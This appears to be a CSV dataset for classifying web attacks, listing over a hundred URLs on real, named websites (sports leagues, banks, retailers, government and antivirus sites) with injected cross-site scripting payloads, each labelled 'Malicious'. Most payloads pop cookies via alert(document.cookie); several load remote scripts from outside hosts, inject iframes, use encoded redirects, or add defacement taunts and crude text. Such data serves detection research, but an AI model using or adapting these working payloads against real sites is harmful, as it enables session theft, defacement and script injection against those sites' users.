Payloads,Class
http://encyclopedia2.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3<br>b%3c%2fscript%3e,Malicious
http://archive.netbsd.se/search.php?ml=%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.masslottery.com/cgi-bin/search_dir/search.cgi?q=&quot;&gt;&lt;script&gt;alert('zomg pappy won the<br>lottery!');&lt;/script&gt;&amp;e=1&amp;x=0,Malicious
http://news.giggog.com/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://wdfw.wa.gov/fish/ans/identify/search.php?searchby=speciesfamilycategory&amp;search=&quot;&gt;&lt;/a&gt;&lt;script&gt;<br>alert(document.cookie);&lt;/script&gt;,Malicious
http://galaxy.ealing.gov.uk/cgi-bin/vps2.5_viewpoint.sh?enqtype=authortitle&amp;enqpara1=default&amp;s_strin<br>g=testino%2c+mario&amp;s_type='a'&amp;no_of_results=9&amp;authorpage=0&amp;authorrecord=1&amp;sec_stng=&amp;media_stng=&amp;sess<br>ion_no=1443500&amp;time=7917&amp;page=-1&amp;search_string=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,Malicious
http://www.treadclimber.com/global/content_basic.jsp?folder%3c%3efolder_id=2534374302031664&amp;bmuid=12<br>13393925797&amp;adid=dsetdir&amp;originalhostname=&quot;;alert(document.cookie);//&amp;bmuid=1213393931143,Malicious
http://environment-data.uchicago.edu/esintern/detail.cfm?jobid=%3cscript%3ealert(document.cookie);%3<br>c/script%3e,Malicious
http://www.srmg.com/templates/srmg/searchtemplate.aspx?postingid=317&amp;keywords=%3cscript%3ealert(docu<br>ment.cookie);%3c/script%3e,Malicious
http://www.abcteach.com/search.php?q=&quot;&gt;&lt;script/src=http://www.altan.hr/snow/snow1.js&gt;&lt;/script&gt;&amp;searc<br>h_type=1&amp;match_words=2&amp;limit_search=1&amp;_form_action=abcteach search&amp;search_form1_form_visited=1,Malicious
"http://www.bitenova.nl/s/0/<script>alert(""phnjcmlwdd5hbgvydchkb2n1bwvudc5jb29rawupozwvc2nyaxb0pg.."")<\script>",Malicious
http://vietany.com/home/utube.php?tag=php&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!-- &amp;pageid=10,Malicious
http://myespn.go.com/myespn/includes/communityads?titlecolor=0;}&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(docum<br>ent.cookie);&lt;/script&gt;&amp;amp;bodycolor=boobs&amp;amp;urlcolor=balls&amp;amp;backcolor=penis&amp;amp;extpadcolor=dic<br>k&amp;amp;intpadcolor=testicles,Malicious
http://users.gametrailers.com/password_reset_script.php?input[email]=&amp;input[hash]=--%3e%3cscript%3ea<br>lert(document.cookie);%3c/script%3e,Malicious
http://mlb.mlb.com/mlb/sweepstakes/y2008/state_farm/callyourshot_sweeps.jsp?sf_ref=%22%3e%3cscript%3<br>ealert(document.cookie);%3c/script%3e&amp;partnerid=s00468,Malicious
http://boston.redsox.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy was here');&lt;/script&gt;,Malicious
http://kansascity.royals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://losangeles.angels.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://tampabay.rays.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://arizona.diamondbacks.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;,Malicious
http://chicago.cubs.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://storage.organizeit.com/search?p=q&amp;ts=custom&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;restricted=mt_restricted_organizesit,Malicious
http://search.folica.com/search?p=q&amp;ts=custom&amp;isort=score&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;x=0&amp;y=0,Malicious
http://americanbridal.resultspage.com/search?ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://www.cableforum.co.uk/board/10/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.esportboard.de/forum/ankuendigungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://www.exasco.info/forum/depression/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.shellcash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.mafiachaos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.gptoffers.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.race4clicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.starreferrals.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.hostile-city.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.stop-sign.com/se/se332b.php?pg=%22%3e%3c/a%3etesticles&amp;ver=%22%3e%3c/a%3etesticles&amp;n=%22%<br>3e%3c/a%3etesticles&amp;uid=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e&amp;bit_mask=0&amp;bi<br>t_sample=780508868&amp;sv=mss_spin_mss_spin,Malicious
http://bankrollbucks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.commonsensemedia.org/user/register.php?fwd=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.jtpappys.com/products.php?cat=7%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://usa.kaspersky.com/trials/trialsreg.php?aw=trials+page&amp;ref=&quot;&gt;&lt;script&gt;alert(&quot;so anti-virus cant<br>secure their pages?&quot;);&lt;/script&gt;&amp;chapter=146538207,Malicious
http://www.globalcashclicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://wow.maxvellnos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.centralchat.net/chatrooms/cgiirc.php?c=&lt;/title&gt;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://hotlists.hotornot.com/?state=browse&amp;tag=boobs&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.brokencriminals.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://la-familia.nl/register.php?ref=&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.ultimateoutdoorz.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.tropicalterror.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://f.uck-you.com/?who=%3ciframe%20src=http://google.com%3e,Malicious
http://www.mtldnb.com/index.php?name=forums&amp;file=search&amp;search_author=&quot;&gt;&lt;/option&gt;&lt;script&gt;alert(docum<br>ent.cookie);&lt;/script&gt;,Malicious
http://www.lebanonfiles.com/calendar.php?id=6&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://seenonstyle.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.co<br>okie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://nbcsports.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.cook<br>ie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
https://fungalgenomics.concordia.ca/feadb/genesearch.php?allspecies=%3cscript%3ealert(document.cooki<br>e);%3c/script%3e%2bares%2bapul%2bccin%2bclau%2bcele%2bgpan%2bgtra%2bledo%2blsco%2bopil%2bpchr%2bsthe<br>%2btlan%2btver&amp;sel_species%5b%5d=all&amp;gene_name=%22%3etesticles&amp;submit1=search#tlan,Malicious
http://right-move.co.uk/index.php?keywords=&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;iframe src=http://google.com&gt;&lt;/iframe&gt;,Malicious
http://www.poststoriches.com/register.php?ref='&gt;&lt;iframe src=http://google.com&gt;,Malicious
http://www.muzeumgazownictwa.pl/main.php?title=1%22%3e%3c/embed%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.moviemags.com/main.php?title=&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.youngmodelz.com/arylia-related-main.php?title=&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;id=934,Malicious
http://farcry.us.ubi.com/index.php?page=%00&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.colbertnation.com/video?keywords=&lt;/title&gt;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.startrek.com/startrek/view/search/result.html?type=article&amp;search=%22%3e%3c%2fa%3e%3cscri<br>pt%3ealert(%22pappy%20says%3a%20star%20wars%20is%20better%22)%3b%3c%2fscript%3e&amp;category=,Malicious
http://www.radioshack.com/uc/index.jsp?page=researchlibraryarticle&amp;articleurl='); alert(1);<br>//&amp;nobc=click on print,Malicious
http://www.sears.com/shc/s/v_10153_12605_health+testicles&quot;;<br>document.location=&quot;\x68\x74\x74\x70\x3a\x2f\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d,Malicious
http://www.moztips.com/search.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.wnd.com/index.php?fa=http://google.com?%3cscript%3ealert(document.cookie);%3c/script%3e&amp;p<br>ageid=1,Malicious
http://mileskimball.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.c<br>ookie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://www.darkfate.co.uk/main-register.php?ref=&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.modern-empires.com/network/www/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://sitereview.bluecoat.com/index.jsp?&amp;host='&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;policy=view,Malicious
http://www.copyscape.com/signup.php?pro=1&amp;o=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.bootmafia.net/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.weeklytech.com/\&quot;&gt;&lt;marquee&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.midnightcrime.com/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://deadlyground.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.woc.noaa.gov/index.php?topic=&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://turbotax.intuit.com/support/asa/mainpage.jsp?topic=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://antares.stanford.edu/index.php/site/search?pagename=site/search&amp;q='<br>style='position:absolute;left:0;top:0;width:100%;height:100%;z-index:9999' onmousemove='alert(1),Malicious
https://my.garmin.com/mygarmin/createnewaccount.faces?target=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://search.honeywell.com/search?proxystylesheet=ecm_en_frontend&amp;client=ecm_en_frontend&amp;basesite=h<br>oneywell&amp;output=xml_no_dtd&amp;filter=p&amp;site=default_collection&amp;q='); alert('1,Malicious
https://secure.mlb.com/enterworkflow.do?flowid=commerce.cart.billableform&amp;campaigncode=&quot;;&lt;/script&gt;&lt;i<br>frame%20src=http://xssed.com height=100%<br>width=100%&gt;&amp;vouchercode=mlbtv_vochr&amp;keepwfparams=true&amp;c_id=mlb&amp;sku=mlbtvsubprmon2009,Malicious
http://www.marathon.com/search/?search2=&quot;&gt;&lt;script&gt;alert('big oil is bad');&lt;/script&gt;,Malicious
http://remix.bestbuy.com/?s=&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;scope=site&amp;x=0&amp;y=0,Malicious
http://www.firmtools.com/search.php?query=&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;;&gt;&amp;x=0&amp;y=0,Malicious
http://www.seriouswars.net/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://euronews.com/link.php?url=----://google.com&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://m.gavsta.com/html/index_done.php?url=&lt;script&gt;alert(1);&lt;/script&gt;&amp;short_url=&lt;script&gt;alert(1);&lt;/<br>script&gt;,Malicious
http://www.usniff.com/q/--&gt;&lt;iframe src=http://google.com&gt;,Malicious
http://www.cosmeticsdatabase.com/wordsearch.php?query=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.enn.com/search/?q=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
"http://www.homedepot.com/webapp/wcs/stores/servlet/search?keyword=test&quot;&gt;);<br>document.write(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47<br>,115,99,114,105,112,116,62)); //&amp;langid=-1&amp;storeid=10051&amp;catalogid=10053",Malicious
http://www.officemax.com/catalog/refill/inkntoner.jsp?brandid=rfbrand24&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://sa.feurl.com/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
https://ayudahipotecas.bankofamerica.com/img/speedbump/speedbump.html?javascript:alert(document.cook<br>ie);,Malicious
http://www.bankofamerica.com/surveys/popup_visit.cfm?survey_url=http://bankofamerica.researchhq.com/<br>onlinebanking/index.php?cust=cgen&amp;survey_name=&lt;/title&gt;&lt;iframe src=http://google.com<br>alt=&amp;surveynumber=,Malicious
http://sitereview.cwfservice.net/catdesc.jsp?catnum=33&amp;catmap=8&amp;locale=null'); alert('1');&quot;&gt;&lt;img<br>src=x onerror=alert(1);&gt;,Malicious
http://kodak.3106.net/index.php?p=213&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
"http://www.peekyou.com/username=&quot;,evalscripts:true}); alert(1); new<br>ajax.updater(&quot;&quot;,&quot;&quot;,{method:&quot;get&quot;, asynchronous: true,parameters:&quot;",Malicious
http://wp.nu/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://xn--a-nga.eu/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.bdaa.co.uk/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3cscript%3ealert(document.cooki<br>e)%3c/script%3e%3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://php.blink.pl/info.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.sounddogs.com/searchresults.asp?keyword=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.azbuz.com/loginform2.jsp?returnurl=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%<br>3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://www.hitsiz.com/?u=arama&amp;a=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.googles.com/googles/checkuser.jsp?page_url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;b<br>y st@rext trtekforum.com&lt;/h1&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;2;<br>url=http://lht.by.ru/uyar1.html&quot;&gt;,Malicious
http://googletr.com/cars.cfm?pt=2&amp;vid=1173871212_1x02x831175274&amp;rpt=3&amp;kt=8&quot;&gt;&lt;script&gt;alert(document.c<br>ookie)&lt;/script&gt;&lt;h1&gt;by st@rext trtekforum.com&lt;/h1&gt;,Malicious
http://www.maxoyun.com/playgame.php?oid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by s@rext&lt;/h1&gt;,Malicious
http://www.iwkoeln.de/default.aspx?p=lastpub&amp;i=iwdnr&amp;n=lastpub2&amp;m=pub&amp;f=4&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://www.gulum.net/hazir-mesaj/bolumler.php?op=katbak&amp;id=55&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious
http://www.inndir.com/haberler.php?id=73628&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.gonuldergahi.net/ekart/index.php?islem=hazirla&amp;adim=1&amp;kategori_id=6&amp;resimid=388&quot;&gt;&lt;script&gt;<br>alert(document.cookie)&lt;/script&gt;,Malicious
http://www.turk100.org/new.php?switch=newview&amp;timestamp=1175288400&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;,Malicious
http://www.hack-medya.org/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious
http://www.blogcu.com/etiket/%22%3e%3ch1%3eby%20st@rext%20xssed%3cbody%20onload=alert(document.cooki<br>e)%3e,Malicious
http://z0ne-h.net/oyla.asp?haber_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,Malicious
http://www.aktifhaber.com/show_category.php?cat=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://araba.com.tr/ara.php?action=search&amp;searchkeyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.ulkuocaklari.org.tr/ocak.asp?ocak=%22%3e%3cscript%3ealert(%22siz%20%fclkemiz%20i%e7in%20s<br>adece%20bir%20tehditsiniz%20salaklar%20b%f6yle%20%fdrk%20ay%fdr%fdm%fdm%fd%20yaparak%20kendinizi%20k<br>and%fdr%fdyorsunuz...t%fcrkiyemizi%20b%f6yle%20k%fc%e7%fcltecek%20ve%20rezil%20edecek%20planlar%20ya<br>pars%fdn%fdz%20salaklar%20ancak%20b%f6le%20konu%feabilirsiniz%20s%fdk%fdysa%20da%f0a%20%e7%fdk%fdp%2<br>0can%fdn%fdz%fd%20versenize%20lan%20hayat%20k%fdsa!k%fcrt%20yada%20t%fcrk%20alevi%20yad%20s%fcni%20n<br>e%20farkeder%20sava%felarda%20atalar%fdm%fdz%20birlikte%20can%20vermedilermi!siktirin%20gidin%20%fdr<br>k%e7%fd%20pi%e7ler!%20%20atat%fcrk%20derki:'yurta%20bar%fd%fe%20d%fcnyada%20bar%fd%fe'.%20unutmadan%<br>20%fclke%20size%20kald%fdysa%20eywah!%22)%3c/script%3e%3c/script%3c,Malicious
http://www.radyoimparator.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,Malicious
http://ooegm.meb.gov.tr/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://www.midyat.net/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.gopur.org/mf/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h<br>1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.autism-awareness.org.uk/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.yemekyerim.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://just-in.co.uk/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://easy-hit-counters.com/step2.php?style=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://it.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://jp.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://nl.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://da.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://kr.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://888.com/site2/poker/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://jp.888.com/site2/poker/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://da.888.com/site2/backgammon/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://tr.888.com/site2/backgammon/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://pagead2.googlesyndication.com/pagead/iclk?sa=l&amp;ai=bwoevjkzprokjk4-oa4rwgkmbrfhzhuhhgsmcwi23az<br>boeaeyasdpj4qfkaiwadgauot6gaccyjn-noa4ibibcmrvc3lhbs5uzxs6aqk0njh4njbfyxpiaqhaarxodhrwoi8vzg9zewftlm<br>5ldc8_awq9ddj5bjk2qqkzdbye3ukppsgc6dtsaqgdacgdbw&amp;num=1&amp;adurl=http://vuln.xssed.net/thirdparty/script<br>s/python5.html,Malicious
http://marmarali.biz/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;ww<br>w.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.no-ip.com/whois/?domain=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.forumup.us/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.forumup.web.tr/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://bloodhacker.forumup.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%<br>3e,Malicious
http://staff.forumup.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.horde.org/download/app/?app=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://whois.ws/domain_suggestions.php?current_name=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
"http://ted.europa.eu/exec?dataflow=showpage.dfl&amp;template=%22;alert(string.fromcharcode(83,69,67,85,8<br>2,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67<br>,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.esteio.rs.gov.br/home/show_page.asp?id_conteudo=+128&amp;codid_cat=+17&amp;imgcat=tema_search.jpg<br>&amp;procurar=%22%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e<br>%3c%2fscript%3e&amp;bfind.x=14&amp;bfind.y=17,Malicious
http://www.ville-laboisse.fr/index.php?class=communes%22%3e%3cscript%20src=http://vuln.xssed.net/thi<br>rdparty/scripts/ckers.org.js%3e%3c/script%3e&amp;function=index&amp;template=matricecommune.html&amp;file=indexc<br>ommune.html&amp;nocache=1&amp;resolution=1024,Malicious
